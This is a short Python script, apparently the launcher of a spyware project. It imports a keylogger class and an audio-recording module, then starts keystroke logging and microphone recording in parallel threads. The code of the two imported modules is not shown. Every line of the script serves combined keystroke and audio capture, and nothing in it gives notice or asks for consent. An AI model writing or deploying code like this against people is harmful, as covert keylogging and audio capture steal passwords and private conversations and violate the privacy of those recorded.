from keylogger import Keylogger
import audio_recorder as ar
import threading 

key = Keylogger()
# audio = Audio_recorder()

def record_keylogger():
    key.start_recording()

def record_audio():
    ar. start_record()

key_thread= threading.Thread(target=record_keylogger)
audio_thread= threading.Thread(target=record_audio)

key_thread.start()
audio_thread.start()

        